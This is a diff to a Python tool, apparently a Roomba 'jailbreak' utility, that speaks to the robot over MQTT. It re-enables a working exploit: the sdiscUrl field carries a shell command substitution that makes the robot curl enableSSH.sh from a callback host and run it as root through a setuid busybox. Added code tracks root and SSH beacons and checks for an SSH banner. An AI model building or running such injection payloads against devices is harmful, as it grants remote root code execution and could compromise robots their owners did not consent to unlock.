@@ -6,7 +6,9 @@ import socket
 import ssl
 import sys
 import threading
-from http.server import BaseHTTPRequestHandler, HTTPServer
+import time
+import re
+from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer as HTTPServer
 from typing import cast
 
 import paho.mqtt.client as mqtt
@@ -15,16 +17,14 @@ from paho.mqtt.enums import CallbackAPIVersion
 # connectivity_manager rejects any sdiscUrl longer than this (cmp r0,0xbf at 0x101d0).
 SDISCURL_MAX_BYTES = 191
 
-def get_local_ip():
+def get_local_ip(robot_ip: str) -> str:
+    """Ask the OS for the route's source address; UDP connect sends no packet."""
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     try:
-        s.connect(('8.8.8.8', 80))
-        IP = s.getsockname()[0]
-    except Exception:
-        IP = '127.0.0.1'
+        s.connect((ipv4_address(robot_ip), 8883))
+        return ipv4_address(s.getsockname()[0])
     finally:
         s.close()
-    return IP
 
 httpd : HTTPServer|None = None
 
@@ -33,16 +33,16 @@ mqttc = None
 CONNECT_TIMEOUT = 10.0
 PUBLISH_TIMEOUT = 5.0
 CLEANUP_TIMEOUT = 1.0
-DELTA = "delta"
+RESOLVE_TIMEOUT = 5.0
+WIFICTL = "wifictl"
 RUNJAILED_HOME = "/data/opt/irobot/persistent/opt/runjailed"
 AVAILABLE_CMD_SPACE = 1
 
 def sendCmd(cmd: str):
-    """Publish the raw string as state.sdiscUrl on topic delta.
+    """Publish state.sdiscUrl on the external wifictl topic.
 
-    local_manager bridges the external topic ``delta`` to the internal topic
-    ``local/delta``, which connectivity_manager subscribes to. Publishing on
-    ``wifictl`` never reaches the sdiscUrl handler.
+    The owner's successful firmware handoff reports that local_manager unwraps
+    state and forwards to local/delta. The internal topic is not the external one.
 
     True only means Paho accepted the publish locally. It does not confirm
     broker delivery, robot processing, or shell execution.
@@ -57,29 +57,87 @@ def _publish_cmd(cmd: str):
     if mqttc is None:
         raise RuntimeError("MQTT client is not initialized")
     # local_manager accepts only fixed header 0x30: QoS 0, no RETAIN/DUP.
-    return mqttc.publish("delta", json.dumps({"state": {"sdiscUrl": cmd}}), qos=0, retain=False)
+    return mqttc.publish(WIFICTL, json.dumps({"state": {"sdiscUrl": cmd}}), qos=0, retain=False)
 
 def sendChunkedCommand(cmd: str, file: str|None = "I", display: str|None = None):
-    raise NotImplementedError("Shell commands are unsupported: sendCmd only configures a discovery URL")
+    raise NotImplementedError("Legacy chunking is unsupported; use --enable-ssh")
 
 
 def runAsRoot(cmd: str, file:str="I"):
-    raise NotImplementedError("Root commands are unsupported: sendCmd only configures a discovery URL")
+    raise NotImplementedError("Legacy root helper is unsupported; use --enable-ssh")
 
 
-def enableSshUrl(host: str, port: int = 8899, beacon_port: int = 8883,
-                 busybox: str = "/bin/busybox", use_su: bool = False) -> str:
-    """Build the sdiscUrl payload that makes connectivity_manager fetch and run
-    enableSSH.sh.
+def ipv4_address(host: str) -> str:
+    """Only canonical unicast IPv4 literals may enter shell arguments."""
+    import ipaddress
+    try:
+        address = ipaddress.IPv4Address(host)
+        if address.is_unspecified or int(address) >= 0xe0000000:
+            raise ValueError
+    except (ValueError, TypeError):
+        raise ValueError("host must be a unicast IPv4 address") from None
+    return str(address)
 
-    use_su wraps the command in ``busybox su -c`` so it runs as root. That needs
-    a setuid busybox, which the examined firmware image does not show, so the
-    default fetches and runs as the connectivity user (``apps``) instead.
+
+def resolve_callback(host: str, allow_dns: bool = True) -> str:
+    """Resolve once on the host; only a validated numeric address enters shell.
+
+    DNS is bounded and ambiguous multi-address answers are rejected. --dry-run
+    refuses DNS altogether, so it needs an explicit literal callback address.
     """
-    fetch = (f"wget -qO/tmp/e http://{host}:{port}/enableSSH.sh;"
-             f"sh /tmp/e {host} {port} {beacon_port}")
-    inner = f"{busybox} su -c '{fetch}'" if use_su else fetch
-    url = f"https://$({inner})"
+    try:
+        return ipv4_address(host)
+    except ValueError:
+        pass
+    if not allow_dns:
+        raise ValueError("dry-run requires a literal callback IPv4 address")
+    labels = host.rstrip(".").split(".")
+    if (len(host) > 253 or not re.search(r"[A-Za-z]", host) or
+            any(not re.fullmatch(r"[A-Za-z0-9](?:[A-Za-z0-9-]{0,61}[A-Za-z0-9])?", label)
+                for label in labels)):
+        raise ValueError("invalid callback hostname or IPv4 address")
+    answers = []
+    errors = []
+    done = threading.Event()
+
+    def resolve():
+        try:
+            answers.extend(socket.getaddrinfo(host, None, socket.AF_INET, socket.SOCK_STREAM))
+        except OSError as exc:
+            errors.append(exc)
+        finally:
+            done.set()
+
+    threading.Thread(target=resolve, daemon=True).start()
+    if not done.wait(RESOLVE_TIMEOUT):
+        raise TimeoutError("callback hostname resolution timed out; pass a literal IPv4")
+    if errors:
+        raise ValueError("callback hostname resolution failed; pass a literal IPv4")
+    addresses = {ipv4_address(answer[4][0]) for answer in answers}
+    if len(addresses) != 1:
+        raise ValueError("callback hostname must resolve to exactly one IPv4; pass a literal address")
+    return addresses.pop()
+
+
+def valid_port(port) -> int:
+    if not isinstance(port, int) or isinstance(port, bool) or not 1 <= port <= 65535:
+        raise ValueError("port must be an integer between 1 and 65535")
+    return port
+
+
+def enableSshUrl(host: str, port: int = 8883, beacon_port: int | None = None) -> str:
+    """Build the owner's curl + setuid-root bootstrap, not a firmware probe.
+
+    Both files and beacons use the same HTTP listener. A failed curl must not
+    execute a stale /tmp/e. The complete field, not just its command, is bounded.
+    """
+    host = ipv4_address(host)
+    port = valid_port(port)
+    if beacon_port is not None and beacon_port != port:
+        raise ValueError("downloads and beacons must use the same port")
+    fetch = (f"/usr/bin/curl -fsS -m15 -o /tmp/e http://{host}:{port}/enableSSH.sh"
+             f"&&sh /tmp/e {host} {port}")
+    url = f"https://$(/bin/busybox.suid su -c '{fetch}')"
     if len(url.encode()) > SDISCURL_MAX_BYTES:
         raise ValueError(f"payload is {len(url.encode())} bytes, max {SDISCURL_MAX_BYTES}")
     return url
@@ -126,39 +184,125 @@ def on_message(client, userdata, msg):
         return
     print("Discovered: " + robotDat.get('sku', '?') + " on " + robotDat.get('softwareVer', '?'))
 
-    print("Automatic jailbreak workflow is disabled: sendCmd only configures a discovery URL.")
+
+class DeviceEvidence:
+    """Attempt-local HTTP observations, attributed to the configured robot IP.
+
+    These are not authenticated attestations; use a trusted LAN. A beacon is
+    never independently proof of privilege or a working SSH service.
+    """
+    REQUIRED = ("/enableSSH.sh", "/whoami/root", "/sshd.socket", "/done/ssh")
+
+    def __init__(self, robot_ip):
+        self.robot_ip = ipv4_address(robot_ip)
+        self._lock = threading.Lock()
+        self._active = False
+        self._attempt = 0
+        self._paths = set()
+
+    def arm(self):
+        with self._lock:
+            self._paths.clear()
+            self._attempt += 1
+            self._active = True
+
+    def ticket(self):
+        with self._lock:
+            return self._attempt if self._active else None
+
+    def record(self, path, source, ticket):
+        with self._lock:
+            if ticket == self._attempt and self._active and source == self.robot_ip and path in self.REQUIRED:
+                self._paths.add(path)
+
+    def missing(self):
+        with self._lock:
+            return [path for path in self.REQUIRED if path not in self._paths]
+
+
+def read_ssh_banner(host, port, timeout):
+    """Read a complete SSH identification line with a total monotonic deadline."""
+    deadline = time.monotonic() + timeout
+    try:
+        with socket.create_connection((ipv4_address(host), valid_port(port)), timeout=timeout) as sock:
+            line = bytearray()
+            for _ in range(4096):
+                remaining = deadline - time.monotonic()
+                if remaining <= 0:
+                    return None
+                sock.settimeout(remaining)
+                byte = sock.recv(1)
+                if not byte:
+                    return None
+                line.extend(byte)
+                if len(line) > 255:
+                    return None
+                if byte == b"\n":
+                    if line.startswith(b"SSH-"):
+                        if re.fullmatch(rb"SSH-(?:2\.0|1\.99)-[!-~]+(?:[ -~]*)\r?\n", line):
+                            return line.decode("ascii").rstrip("\r\n")
+                        return None
+                    line.clear()  # RFC 4253 permits pre-identification text.
+    except (OSError, ValueError):
+        return None
+    return None
+
+
+def verify_device(evidence, robot_ip, ssh_port, timeout, state):
+    """Poll observations and SSH only; never reconnect or republish the payload."""
+    deadline = time.monotonic() + timeout
+    while time.monotonic() < deadline:
+        _check_connection(state)
+        if not evidence.missing():
+            banner = read_ssh_banner(robot_ip, ssh_port, min(1.0, deadline - time.monotonic()))
+            _check_connection(state)
+            if banner:
+                return banner
+        state.disconnected.wait(max(0, min(0.2, deadline - time.monotonic())))
+    missing = evidence.missing()
+    detail = ", ".join(missing) if missing else "SSH protocol banner"
+    print(f"Device verification incomplete: missing {detail}. No automatic retry.",
+          file=sys.stderr, flush=True)
+    return None
+
 
 class RunjailedHTTPHandler(BaseHTTPRequestHandler):
-    def log_message(self, format, *args): pass
+    """One HTTP port for allowlisted downloads and exact beacon endpoints."""
+    def log_message(self, format, *args):
+        pass
+
+    def setup(self):
+        super().setup()
+        self.connection.settimeout(2)
 
     def do_GET(self):
+        evidence = getattr(self.server, "evidence", None)
+        ticket = evidence.ticket() if evidence is not None else None
+        if evidence is not None and self.client_address[0] != evidence.robot_ip:
+            self.send_error(403, "Not the configured robot")
+            return
+        if self.path in ("/enableSSH.sh", "/sshd.socket"):
+            from pathlib import Path
+            try:
+                body = (Path(__file__).parent / "scripts" / self.path[1:]).read_bytes()
+            except OSError:
+                self.send_error(500, "Robot artifact unavailable")
+                return
+        elif self.path in ("/whoami/root", "/whoami/apps", "/done/ssh"):
+            body = b"observed; not SSH verification\n"
+        else:
+            self.send_error(404)
+            return
         self.send_response(200)
-        
         self.send_header("Content-type", "text/plain")
+        self.send_header("Content-Length", str(len(body)))
         self.end_headers()
+        self.wfile.write(body)
+        self.wfile.flush()
+        if evidence is not None:
+            evidence.record(self.path, self.client_address[0], ticket)
+        print(f"HTTP observed {self.client_address[0]} {self.path}", flush=True)
 
-        # Also append to a log so callers that redirect stdout (oneclick-ssh.sh)
-        # can observe the beacons without racing the process's own output.
-        beacon_log = os.environ.get("RUNJAILED_BEACON_LOG")
-        if beacon_log:
-            with open(beacon_log, "a") as fh:
-                fh.write(self.path + "\n")
-        
-        if "done/downloading" in self.path:
-          print("[SUCCESS] Downloaded all scripts, now unlocking!")
-        if "done/unlocking" in self.path:
-          print("[SUCCESS] Unlocked!")
-        if "done/ssh" in self.path:
-          print("[SUCCESS] Enabled SSH!")
-        if "done/http" in self.path:
-          print("[SUCCESS] Enabled HTTP!")
-        if "whoami/" in self.path:
-          usr = self.path.split("whoami/")[1]
-          pref = "[SUCCESS]" if "root" in usr else "[FAIL?]"
-          print(f"{pref} Running script on Roomba as {usr}.")
-        if "version/" in self.path:
-          ver = self.path.split("version/")[1]
-          print(f"[SUCCESS] Downloaded roomba::unjailed v{ver} to Roomba.")
 
 def main():
     global LOCAL_IP, httpd, mqttc
@@ -172,44 +316,101 @@ def main():
     parser.add_argument("--password", "-p", dest="password",
                         help="Your robot's password (or $ROOMBA_PASSWORD)",
                         default=os.environ.get("ROOMBA_PASSWORD"), type=str)
-    parser.add_argument("--callback", "-c", dest="cb", help="Your computer's LAN IP", required=False, type=str)
-    parser.add_argument("--beacon-port", dest="beacon_port", type=int, default=8883,
-                        help="local port for the HTTP beacon server (default 8883)")
+    parser.add_argument("--callback", "--host-ip", "-c", dest="cb",
+                        help="This computer's LAN IPv4 or single-address hostname", type=str)
+    parser.add_argument("--http-port", type=int, help="shared HTTP download/beacon port (default 8883)")
+    parser.add_argument("--beacon-port", type=int, help="legacy alias for --http-port; must match")
+    parser.add_argument("--ssh-port", type=int, default=22, help="SSH banner probe port (default 22)")
+    parser.add_argument("--timeout", type=float, default=120,
+                        help="bounded device-verification window after local send (default 120s)")
     parser.add_argument("--send", dest="send", action="append", default=[], metavar="URL",
-                        help="publish this state.sdiscUrl value after connecting (repeatable)")
-    parser.add_argument("--enable-ssh", dest="enable_ssh", metavar="HOST[:PORT]",
-                        help="publish the payload that runs enableSSH.sh on the robot as root")
+                        help="publish state.sdiscUrl (repeatable); local send only, NOT device verification")
+    parser.add_argument("--enable-ssh", dest="enable_ssh", nargs="?", const="auto", metavar="HOST[:PORT]",
+                        help="serve, publish once and verify runtime SSH using the callback host")
+    parser.add_argument("--dry-run", action="store_true",
+                        help="print payload without credentials, DNS, sockets or publish; use literal IPv4")
     parser.add_argument("--send-delay", dest="send_delay", type=float, default=1.5,
-                        help="seconds between publishes (default 1.5)")
+                        help="seconds between manual sends (default 1.5)")
     parser.add_argument("--linger", dest="linger", type=float, default=15,
-                        help="seconds to keep the beacon server up after sending (default 15)")
+                        help="manual --send mode HTTP linger; SSH mode uses --timeout")
 
     args = parser.parse_args()
+    if args.enable_ssh == "":
+        parser.error("--enable-ssh host cannot be empty")
     for name in ("send_delay", "linger"):
         value = getattr(args, name)
         if not math.isfinite(value) or value < 0:
             parser.error(f"--{name.replace('_', '-')} must be finite and nonnegative")
+    if not math.isfinite(args.timeout) or args.timeout <= 0:
+        parser.error("--timeout must be finite and positive")
+    try:
+        args.ip = ipv4_address(args.ip)
+        valid_port(args.ssh_port)
+        specified_ports = [valid_port(p) for p in (args.http_port, args.beacon_port) if p is not None]
+        if args.enable_ssh and args.send:
+            raise ValueError("--enable-ssh cannot be mixed with --send")
+        urls = list(args.send)
+        for url in urls:
+            if len(url.encode()) > SDISCURL_MAX_BYTES:
+                raise ValueError("sdiscUrl must be at most 191 bytes")
+        if args.enable_ssh:
+            if args.enable_ssh == "auto":
+                if args.dry_run and not args.cb:
+                    raise ValueError("dry-run requires --host-ip with a literal IPv4")
+                host = args.cb or get_local_ip(args.ip)
+            else:
+                host, separator, port = args.enable_ssh.partition(":")
+                if separator:
+                    specified_ports.append(valid_port(int(port)))
+            LOCAL_IP = resolve_callback(host, allow_dns=not args.dry_run)
+            if args.cb and args.cb != host and resolve_callback(args.cb, allow_dns=not args.dry_run) != LOCAL_IP:
+                raise ValueError("--callback must match --enable-ssh host")
+        elif args.cb:
+            LOCAL_IP = resolve_callback(args.cb, allow_dns=not args.dry_run)
+        elif args.dry_run:
+            LOCAL_IP = ""
+        else:
+            LOCAL_IP = get_local_ip(args.ip)
+        if len(set(specified_ports)) > 1:
+            raise ValueError("downloads and beacons must use the same port")
+        port = specified_ports[0] if specified_ports else 8883
+        if args.enable_ssh:
+            urls.append(enableSshUrl(LOCAL_IP, port))
+    except (ValueError, OSError) as exc:
+        parser.error(str(exc))
+
+    if args.dry_run:
+        if not urls:
+            parser.error("--dry-run requires --send or --enable-ssh")
+        print("DRY RUN: no services, DNS or publish; NOT device verification")
+        for url in urls:
+            print(f"wifictl MQTT 3.1.1 QoS0 retain=False bytes={len(url.encode())}: "
+                  + json.dumps({"state": {"sdiscUrl": url}}))
+        return 0
+    if sys.stdin.isatty():
+        import getpass
+        if not args.blid:
+            args.blid = input("BLID: ").strip()
+        if not args.password:
+            args.password = getpass.getpass("Robot password: ")
     if not args.blid:
         parser.error("--blid is required (or set ROOMBA_BLID)")
     if not args.password:
         parser.error("--password is required (or set ROOMBA_PASSWORD)")
 
-    urls = list(args.send)
-    if args.enable_ssh:
-        host, _, port = args.enable_ssh.partition(":")
-        urls.append(enableSshUrl(host, int(port or 8899), args.beacon_port,
-                                 busybox=os.environ.get("ROOMBA_BUSYBOX", "/bin/busybox")))
-
-    LOCAL_IP = args.cb or get_local_ip()
-
-    server_address = ('', args.beacon_port)
-    httpd = HTTPServer(server_address, RunjailedHTTPHandler)
-
-    t = threading.Thread(target=httpd.serve_forever, daemon=True)
+    evidence = DeviceEvidence(args.ip)
+    try:
+        httpd = HTTPServer((LOCAL_IP, port), RunjailedHTTPHandler)
+    except OSError as exc:
+        print(f"HTTP listener failed: {exc}", file=sys.stderr, flush=True)
+        return 1
+    setattr(httpd, "evidence", evidence)
+    t = threading.Thread(target=httpd.serve_forever, kwargs={"poll_interval": 0.1}, daemon=True)
     t.start()
 
     state = ConnectionState()
     mqttc = mqtt.Client(CallbackAPIVersion.VERSION2, userdata=state,
+                        client_id=args.blid, protocol=mqtt.MQTTv311,
                         reconnect_on_failure=False)
     mqttc.on_connect = on_connect
     mqttc.on_message = on_message
@@ -236,6 +437,8 @@ def main():
             _check_connection(state)
         for index, url in enumerate(urls):
             _check_connection(state)
+            if args.enable_ssh:
+                evidence.arm()
             info = _publish_cmd(url)
             if info.rc != mqtt.MQTT_ERR_SUCCESS:
                 raise RuntimeError(f"MQTT publish failed: rc={info.rc}")
@@ -248,6 +451,13 @@ def main():
                 state.disconnected.wait(args.send_delay)
                 _check_connection(state)
         # QoS 0 confirms only local socket send, not broker/robot processing.
+        if args.enable_ssh:
+            banner = verify_device(evidence, args.ip, args.ssh_port, args.timeout, state)
+            if banner is None:
+                return 3
+            print(f"[VERIFIED] Downloads + root beacon + done/ssh + SSH banner: {banner}", flush=True)
+            return 0
+        print("Local send complete; device execution NOT verified.", flush=True)
         if args.linger:
             print(f"listening for beacons for {args.linger:g}s ...", flush=True)
             state.disconnected.wait(args.linger)
